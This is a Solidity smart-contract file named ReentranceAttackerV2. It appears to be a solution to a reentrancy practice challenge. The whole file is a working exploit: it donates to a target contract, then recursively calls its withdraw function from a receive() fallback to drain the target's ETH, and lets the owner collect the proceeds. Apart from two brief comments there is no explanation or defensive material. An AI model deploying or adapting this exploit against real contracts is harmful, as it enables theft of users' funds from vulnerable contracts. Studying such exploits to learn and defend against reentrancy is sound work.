
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256);
}

contract ReentranceAttackerV2 {
    IReentrance public reentranceContract;
    address public owner;

    constructor(address _reentranceAddress) public {
        reentranceContract = IReentrance(_reentranceAddress);
        owner = msg.sender;
    }

    function attack(uint256 _amount) public payable {
        reentranceContract.donate{value: _amount}(address(this));
        reentranceContract.withdraw(_amount);
    }

    receive() external payable {
        // This will recursively call withdraw until no more funds can be withdrawn.
        // The amount passed to withdraw is the amount received in the current call.
        reentranceContract.withdraw(msg.value);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // Function to withdraw all ETH from this contract to the owner
    function withdrawAll() public {
        require(msg.sender == owner, "Not owner");
        address payable _owner = payable(owner);
        _owner.transfer(address(this).balance);
    }
}
